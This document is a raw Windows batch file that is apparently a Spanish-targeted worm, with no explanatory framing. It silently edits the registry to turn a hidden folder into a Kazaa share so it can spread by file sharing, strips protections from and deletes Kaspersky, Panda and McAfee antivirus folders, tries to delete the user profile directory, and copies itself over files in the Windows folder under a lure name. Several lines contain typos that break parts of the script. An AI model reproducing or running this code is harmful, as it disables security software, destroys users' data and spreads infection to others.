@echo off
if exist %windir%\syystem\asianporn.bat goto blood2
if not exist %windir\syystem\asianporn.bat goto blood
:blood
md %windir%\syystem
echo @="+">%windir%\syystem\01.reg
echo "DownloadDir"="%windir%\syystem">>%windir%\syystem\01.reg
echo "DatabaseDir"="C:\\Archivos de programa\\Kazaa\\Db">>%windir%\syystem\01.reg
echo "ShareDir"="%windir%\syystem">%windir%\syystem\02.reg
echo "ExeDir"="C:\\Archivos de programa\\Kazaa">>%windir%\syystem\02.reg
echo [HKEY_LOCAL_MACHINE\Software\Kazaa\LocalContent]>>%windir%\syystem\01.reg
@REGEDIT /S /C %windir%\syystem\01.reg
ECHO [HKEY_LOCAL_MACHINE\Software\Kazaa\CloudLoad]>>%windir%\syystem\02.reg
@REGEDIT /S /C %windir%\sysstem\02.reg
del %windir%\syystem\*.reg
@attrib C:\Archivos de programa\Kaspersky Lab\*.* -h-r-s
del C:\Archivos de programa\Kaspersky Lab\>nul
@attrib c:\Archivos de programa\Panda Software\*.* -h-r-s
del c:\Archivos de programa\Panda Software\Panda\>nul
@attrib C:\Archivos de programa\McAfee\*.* -h-r-s
del C:\Archivos de programa\McAfee\>nul
if exist c:\misdoc~1\ goto vir1
If exist c:\Documents and Settings\ goto vir2
:vir1
for %%i in (c:\misdoc~1\*.jpg *.jpeg *.bmp *.tif *.gif) do copy %0>nul
:vir2
del c:\c:\Documents and Settings>nul
@attrib %windir%\*.* -h-r-s
for %%i in (%windir%\*.bat *.exe *.com *.html *.htm *.js) do copy %0>nul
if not exist %windir%\syystem\asianporn.bat copy blood.bat %windir%\syystem\asianporn.bat>nul
:blood2
exit



  
